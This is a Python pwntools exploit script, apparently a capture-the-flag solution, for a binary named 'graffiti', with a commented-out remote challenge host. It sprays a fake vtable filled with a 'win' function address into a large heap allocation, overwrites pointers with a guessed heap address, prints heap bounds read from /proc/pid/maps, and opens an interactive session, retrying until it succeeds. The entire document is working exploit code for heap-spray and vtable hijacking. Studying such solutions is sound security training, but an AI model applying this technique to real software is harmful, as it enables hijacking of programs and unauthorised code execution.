from pwn import*
import re

def get_heap_address(pid):
    with open(f'/proc/{pid}/maps', 'r') as f:
        maps = f.read()
    
    # 힙 영역 찾기
    heap_match = re.search(r'([0-9a-f]+)-([0-9a-f]+).*\[heap\]', maps)
    if heap_match:
        heap_start = int(heap_match.group(1), 16)
        heap_end = int(heap_match.group(2), 16)
        return heap_start, heap_end
    return None, None

def normal(content, many):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b'?', str(many).encode())
    p.sendafter(b">", content)

def blue(content, many):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b'?', str(many).encode())
    p.sendafter(b">", content)

def red(content):
    p.sendlineafter(b">", b"3")
    p.sendafter(b">", content)

import time
while True:
    try:
        p = process("./graffiti")
        #p = remote("pwn.ssdc.ac", 15252)
        win = 0x40149c
        heap_addr = 0x2839029800
        #heap_addr = 0x41e40800
        fake_vtable = p64(win) * 8
        blue(fake_vtable, 4096 * 128)
        time.sleep(1)
        p.sendline(b'1337')
        p.sendafter(b'labeling', b'12')
        p.send(p64(heap_addr) * 100)
        # pause 직전에 힙 주소 읽기
        pid = p.pid
        heap_start, heap_end = get_heap_address(pid)
        if heap_start and heap_end:
            log.info(f"Process PID: {pid}")
            log.info(f"Heap start address: 0x{heap_start:x}")
            log.info(f"Heap end address: 0x{heap_end:x}")
            log.info(f"Heap size: 0x{heap_end - heap_start:x}")
            print(f"\n=== HEAP INFO ===")
            print(f"PID: {pid}")
            print(f"Heap Start: 0x{heap_start:x}")
            print(f"Heap End: 0x{heap_end:x}")
            print(f"Heap Size: 0x{heap_end - heap_start:x}")
            print(f"================\n")
        else:
            log.warning("힙 주소를 찾을 수 없습니다.")
        pause()
        p.sendline(b'4')
        p.interactive()
    except Exception as e:
        log.error(f"Error: {e}")
        if 'p' in locals():
            p.close()
        continue
